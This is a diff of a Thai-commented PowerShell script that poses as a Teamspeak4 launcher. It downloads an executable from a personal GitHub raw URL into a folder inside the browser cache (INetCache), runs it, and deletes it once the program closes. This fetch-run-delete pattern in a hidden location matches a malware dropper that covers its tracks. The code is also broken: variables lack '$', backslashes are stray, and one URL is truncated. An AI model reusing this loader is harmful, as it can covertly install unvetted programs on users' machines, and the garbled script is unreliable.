@@ -1,16 +1,15 @@
 # ====================================================================
-# สคริปต์ดาวน์โหลด รัน และลบไฟล์อัตโนมัติหลังปิดโปรแกรม
+# สคริปต์ดาวน์โหลด รัน และลบไฟล์อัตโนมัติหลังปิดโปรแกรม (เวอร์ชันแก้ไข Syntax)
 # ====================================================================
 
-# บังคับให้แสดงผลภาษาไทย/อังกฤษในคอนโซลได้อย่างถูกต้อง
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 
-# 1. ตั้งค่าตัวแปรและพาธสำหรับเก็บไฟล์ในระบบ (โฟลเดอร์ Cache ของระบบ)
+# 1. ตั้งค่าตัวแปรและพาธสำหรับเก็บไฟล์ในระบบ (แก้ไขการประกาศตัวแปรให้ถูกต้อง)
 cacheDir = "env:LOCALAPPDATA\Microsoft\INetCache\cache"
 exePath = "cacheDir\Teamspeak4.exe"
 dllPath = "cacheDir\TS3.dll"
 
-# ลิงก์สำหรับดาวน์โหลดไฟล์ดิบ (Raw URL) จาก GitHub ของคุณ
+# ลิงก์สำหรับดาวน์โหลดไฟล์ดิบจาก GitHub ของคุณ
 \$exeUrl   = "https://raw.githubusercontent.com/kanokpoltankaew712-gif/Teamspeak4cvrftg/main/Teamspeak4.exe"
 \$dllUrl   = "https://githubusercontent.com"
 
@@ -33,11 +32,11 @@ Write-Host "`nStarting Teamspeak4..." -ForegroundColor Yellow
 Write-Host "Teamspeak4 is running. Wait until you close the program..." -ForegroundColor Green
 Write-Host "(Do not close this PowerShell window)" -ForegroundColor Yellow
 
-# รันโปรแกรมและรอจนจบกระบวนการ (โปรแกรมปิด หน้าต่างนี้ถึงจะทำงานต่อ)
+# รันโปรแกรมและรอจนจบกระบวนการ (แก้ไขเครื่องหมายหน้าตัวแปร)
 Start-Process -FilePath \$exePath -Wait
 
-# 4. กระบวนการทำความสะอาด ลบไฟล์ทิ้งทันทีหลังปิดโปรแกรม
-Write-Host "`n[!] Program closed. Starting cleanup process..." -ForegroundColor Maroon
+# 4. กระบวนการทำความสะอาด ลบไฟล์ทิ้งทันทีหลังปิดโปรแกรม (แก้ไขสีเป็น DarkRed)
+Write-Host "`n[!] Program closed. Starting cleanup process..." -ForegroundColor DarkRed
 
 # ลบไฟล์ Teamspeak4.exe
 if (Test-Path $exePath) {
